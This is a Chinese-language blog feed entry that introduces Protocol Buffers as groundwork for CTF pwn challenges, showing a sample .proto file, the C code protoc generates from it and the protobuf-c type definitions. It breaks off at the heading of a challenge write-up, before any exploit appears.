<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>196082&#39;s blog</title>
  
  
  <link href="https://cv196082.gitee.io/atom.xml" rel="self"/>
  
  <link href="https://cv196082.gitee.io/"/>
  <updated>2023-05-30T08:28:07.409Z</updated>
  <id>https://cv196082.gitee.io/</id>
  
  <author>
    <name>196082</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于protobuf的解题步骤</title>
    <link href="https://cv196082.gitee.io/2023/05/30/protobuf/"/>
    <id>https://cv196082.gitee.io/2023/05/30/protobuf/</id>
    <published>2023-05-30T08:26:30.000Z</published>
    <updated>2023-05-30T08:28:07.409Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实在以前已经多次遇见过<code>protobuf</code>了，但是都不太在意因为总感觉会像musl库一样，存活一段时间后就消失了。所以也导致我一直没有去真正做过这样的题，这次国赛第一天恰好出现了这样一道题，不出意外没能解出来，如果不看wp我可能还会怀疑自己的逆向能力，因为我蠢到看了几个小时的1200多行代码。最可恶的是当初不想玩web的一大原因就是我比较粗心大意，面对信息收集时往往会忽略掉重要信息，但是现在的pwn也越来越往这个方向靠了。不可否认的是，这提升了选手的综合实力(<del>恶心选手</del>)，只是我不太能接受从一个坑又跳到了另外一个坑里面去了。不过，需要认清现实的是我的逆向水平确实很差，我也准备开始刷逆向题了。</p><h2 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h2><h3 id="什么是protobuf"><a href="#什么是protobuf" class="headerlink" title="什么是protobuf"></a>什么是protobuf</h3><p>Protocol Buffers，是Google公司开发的一种数据描述语言，类似于XML能够将结构化数据序列化，可用于数据存储、通信协议等方面。它不依赖于语言和平台并且可扩展性极强。</p><p>同XML相比，Protocol buffers在序列化结构化数据方面有许多优点：</p><ol><li>  更简单</li><li>  数据描述文件只需原来的1/10至1/3</li><li>  解析速度是原来的20倍至100倍</li><li>  减少了二义性</li><li>  生成了更容易在编程中使用的数据访问</li><li>支持多种编程语言<br>   （转自百度百科）</li></ol><p>这里就不多提了，安装的话自己搜一下就有的。</p><h3 id="使用protobuf"><a href="#使用protobuf" class="headerlink" title="使用protobuf"></a>使用protobuf</h3><p>首先编写一个测试文件<code>test.proto</code></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">int64</span> aaa = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">uint64</span> bbb = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">sint64</span> ccc = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">required</span> <span class="built_in">bytes</span> ddd = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>protoc --c_out=. ./test.proto</code>命令生成对应代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C_test_2eproto__INCLUDED</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;protobuf-c/protobuf-c.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">PROTOBUF_C__BEGIN_DECLS</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> PROTOBUF_C_VERSION_NUMBER &lt; 1000000</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by a newer version of protoc-c which is incompatible with your libprotobuf-c headers. Please update your headers.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> 1003003 &lt; PROTOBUF_C_MIN_COMPILER_VERSION</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">error</span> This file was generated by an older version of protoc-c which is incompatible with your libprotobuf-c headers. Please regenerate this file with a newer version of protoc-c.</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Test</span> <span class="title">Test</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- enums --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- messages --- */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span>  _<span class="title">Test</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  ProtobufCMessage base;</span><br><span class="line">  <span class="keyword">int64_t</span> aaa;</span><br><span class="line">  <span class="keyword">uint64_t</span> bbb;</span><br><span class="line">  <span class="keyword">int64_t</span> ccc;</span><br><span class="line">  ProtobufCBinaryData ddd;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST__INIT \</span></span><br><span class="line"><span class="meta"> &#123; PROTOBUF_C_MESSAGE_INIT (&amp;test__descriptor) \</span></span><br><span class="line"><span class="meta">    , 0, 0, 0, &#123;0,NULL&#125; &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test methods */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>             *out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test   *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer     *buffer)</span></span>;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span>;</span><br><span class="line"><span class="comment">/* --- per-message closures --- */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*Test_Closure)</span></span></span><br><span class="line"><span class="function">                 <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="keyword">void</span> *closure_data)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- services --- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* --- descriptors --- */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor;</span><br><span class="line"></span><br><span class="line">PROTOBUF_C__END_DECLS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span>  <span class="comment">/* PROTOBUF_C_test_2eproto__INCLUDED */</span></span></span><br></pre></td></tr></table></figure><p>这是<code>test.pb-c.h</code>文件，可以看到其中定义了许多的函数，并且定义了结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Generated by the protocol buffer compiler.  DO NOT EDIT! */</span></span><br><span class="line"><span class="comment">/* Generated from: test.proto */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not generate deprecated warnings for self */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTOBUF_C__NO_DEPRECATED</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;test.pb-c.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__init</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test         *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> Test init_value = TEST__INIT;</span><br><span class="line">  *message = init_value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__get_packed_size</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_get_packed_size ((<span class="keyword">const</span> ProtobufCMessage*)(message));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">uint8_t</span>       *out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack ((<span class="keyword">const</span> ProtobufCMessage*)message, out);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">test__pack_to_buffer</span></span></span><br><span class="line"><span class="function">                     <span class="params">(<span class="keyword">const</span> Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCBuffer *buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  <span class="keyword">return</span> protobuf_c_message_pack_to_buffer ((<span class="keyword">const</span> ProtobufCMessage*)message, buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Test *</span></span><br><span class="line"><span class="function">       <span class="title">test__unpack</span></span></span><br><span class="line"><span class="function">                     <span class="params">(ProtobufCAllocator  *allocator,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">size_t</span>               len,</span></span></span><br><span class="line"><span class="params"><span class="function">                      <span class="keyword">const</span> <span class="keyword">uint8_t</span>       *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (Test *)</span><br><span class="line">     protobuf_c_message_unpack (&amp;test__descriptor,</span><br><span class="line">                                allocator, len, data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>   <span class="title">test__free_unpacked</span></span></span><br><span class="line"><span class="function">                     <span class="params">(Test *message,</span></span></span><br><span class="line"><span class="params"><span class="function">                      ProtobufCAllocator *allocator)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!message)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  assert(message-&gt;base.descriptor == &amp;test__descriptor);</span><br><span class="line">  protobuf_c_message_free_unpacked ((ProtobufCMessage*)message, allocator);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCFieldDescriptor test__field_descriptors[<span class="number">4</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;aaa&quot;</span>,</span><br><span class="line">    <span class="number">1</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_INT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, aaa),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;bbb&quot;</span>,</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_UINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, bbb),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ccc&quot;</span>,</span><br><span class="line">    <span class="number">3</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_SINT64,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ccc),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;ddd&quot;</span>,</span><br><span class="line">    <span class="number">4</span>,</span><br><span class="line">    PROTOBUF_C_LABEL_REQUIRED,</span><br><span class="line">    PROTOBUF_C_TYPE_BYTES,</span><br><span class="line">    <span class="number">0</span>,   <span class="comment">/* quantifier_offset */</span></span><br><span class="line">    offsetof(Test, ddd),</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    <span class="number">0</span>,             <span class="comment">/* flags */</span></span><br><span class="line">    <span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved1,reserved2, etc */</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> test__field_indices_by_name[] = &#123;</span><br><span class="line">  <span class="number">0</span>,   <span class="comment">/* field[0] = aaa */</span></span><br><span class="line">  <span class="number">1</span>,   <span class="comment">/* field[1] = bbb */</span></span><br><span class="line">  <span class="number">2</span>,   <span class="comment">/* field[2] = ccc */</span></span><br><span class="line">  <span class="number">3</span>,   <span class="comment">/* field[3] = ddd */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> ProtobufCIntRange test__number_ranges[<span class="number">1</span> + <span class="number">1</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  &#123; <span class="number">1</span>, <span class="number">0</span> &#125;,</span><br><span class="line">  &#123; <span class="number">0</span>, <span class="number">4</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> ProtobufCMessageDescriptor test__descriptor =</span><br><span class="line">&#123;</span><br><span class="line">  PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC,</span><br><span class="line">  <span class="string">&quot;test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;Test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="keyword">sizeof</span>(Test),</span><br><span class="line">  <span class="number">4</span>,</span><br><span class="line">  test__field_descriptors,</span><br><span class="line">  test__field_indices_by_name,</span><br><span class="line">  <span class="number">1</span>,  test__number_ranges,</span><br><span class="line">  (ProtobufCMessageInit) test__init,</span><br><span class="line">  <span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>    <span class="comment">/* reserved[123] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个文件就是<code>test.pb-c.c</code>文件，内部对<code>test__field_descriptors</code>数组进行了复制，这里使用的结构体为<code>ProtobufCFieldDescriptor</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ProtobufCFieldDescriptor</span> &#123;</span></span><br><span class="line"><span class="comment">/** Name of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tag value of the field as given in the .proto file. */</span></span><br><span class="line"><span class="keyword">uint32_t</span>id;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */</span></span><br><span class="line">ProtobufCLabellabel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The type of the field. */</span></span><br><span class="line">ProtobufCTypetype;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes of the message&#x27;s C structure&#x27;s quantifier field</span></span><br><span class="line"><span class="comment"> * (the `has_MEMBER` field for optional members or the `n_MEMBER` field</span></span><br><span class="line"><span class="comment"> * for repeated members or the case enum for oneofs).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>quantifier_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The offset in bytes into the message&#x27;s C structure for the member</span></span><br><span class="line"><span class="comment"> * itself.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span>offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A type-specific descriptor.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the</span></span><br><span class="line"><span class="comment"> * corresponding `ProtobufCEnumDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to</span></span><br><span class="line"><span class="comment"> * the corresponding `ProtobufCMessageDescriptor`.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Otherwise this field is NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*descriptor; <span class="comment">/* for MESSAGE and ENUM types */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** The default value for this field, if defined. May be NULL. */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span>*default_value;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A flag word. Zero or more of the bits defined in the</span></span><br><span class="line"><span class="comment"> * `ProtobufCFieldFlag` enum may be set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">uint32_t</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">unsigned</span>reserved_flags;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved2;</span><br><span class="line"><span class="comment">/** Reserved for future use. */</span></span><br><span class="line"><span class="keyword">void</span>*reserved3;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而这个结构体中的type就是数据的类型，需要注意的是，我们在<code>proto</code>文件中，分别定义了<code>int64</code>和<code>sint64</code>虽然结构体中都被翻译成了<code>int64_t</code>类型，但是可以在<code>test.pb-c.c</code>文件中看到，他们在上述结构体中的type值是不一样的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">PROTOBUF_C_TYPE_INT32,      <span class="comment">/**&lt; int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT32,     <span class="comment">/**&lt; signed int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED32,   <span class="comment">/**&lt; signed int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_INT64,      <span class="comment">/**&lt; int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SINT64,     <span class="comment">/**&lt; signed int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_SFIXED64,   <span class="comment">/**&lt; signed int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT32,     <span class="comment">/**&lt; unsigned int32 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED32,    <span class="comment">/**&lt; unsigned int32 (4 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_UINT64,     <span class="comment">/**&lt; unsigned int64 */</span></span><br><span class="line">PROTOBUF_C_TYPE_FIXED64,    <span class="comment">/**&lt; unsigned int64 (8 bytes) */</span></span><br><span class="line">PROTOBUF_C_TYPE_FLOAT,      <span class="comment">/**&lt; float */</span></span><br><span class="line">PROTOBUF_C_TYPE_DOUBLE,     <span class="comment">/**&lt; double */</span></span><br><span class="line">PROTOBUF_C_TYPE_BOOL,       <span class="comment">/**&lt; boolean */</span></span><br><span class="line">PROTOBUF_C_TYPE_ENUM,       <span class="comment">/**&lt; enumerated type */</span></span><br><span class="line">PROTOBUF_C_TYPE_STRING,     <span class="comment">/**&lt; UTF-8 or ASCII string */</span></span><br><span class="line">PROTOBUF_C_TYPE_BYTES,      <span class="comment">/**&lt; arbitrary byte sequence */</span></span><br><span class="line">PROTOBUF_C_TYPE_MESSAGE,    <span class="comment">/**&lt; nested message */</span></span><br><span class="line">&#125; ProtobufCType;</span><br></pre></td></tr></table></figure><p>而这里type值的定义是这样的，知道这个很重要，在后续的做题环节中需要。</p><p>然而，这种题目一般来说都是用户态的题目，而面对用户态题目我们写的脚本更多的是使用<code>python</code>去写，这里同样可以使用<code>protoc</code>工具生成<code>python</code>文件可以引入的文件。命令为:<code>protoc --python_out=. ./test.proto</code></p><h2 id="StrangeTalkBot"><a 